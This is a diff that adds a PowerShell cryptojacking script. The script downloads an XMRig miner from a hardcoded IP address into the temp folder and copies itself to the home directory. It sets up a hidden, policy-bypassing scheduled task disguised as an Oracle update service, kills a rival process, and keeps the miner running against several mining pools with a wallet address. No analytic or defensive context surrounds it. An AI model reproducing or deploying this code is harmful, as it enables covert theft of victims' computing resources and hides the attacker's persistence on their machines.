@@ -1,0 +1,21 @@
+$ne = $MyInvocation.MyCommand.Path
+$nurl = "http://158.69.133.18:8220/xmrig.exe"
+$noutput = "$env:TMP\yam2.exe"
+$vc = New-Object System.Net.WebClient
+$vc.DownloadFile($nurl,$noutput)
+copy $ne $HOME\SchTask.ps1
+copy $env:TMP\yam2.exe $env:TMP\te.exe
+
+SchTasks.exe /Create /SC MINUTE /TN "Update service for Oracle productsd" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File $HOME\SchTask1.ps1" /MO 6 /F
+SchTasks.exe /Delete /TN "Update service for Oracle products" /F
+
+while ($true) {
+	if(!(Get-Process te.exe -ErrorAction SilentlyContinue)) {
+		echo "Not running"
+    cmd.exe /C taskkill /IM ddg.exe /f
+		cmd.exe /C $env:TMP\te.exe --donate-level=1 -k -a cryptonight -o 158.69.133.20:3333 -o 192.99.142.249:3333 -o 202.144.193.110:3333 -u 4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg -p x 
+	} else {
+		echo "Running"
+	}
+	Start-Sleep 55
+}		
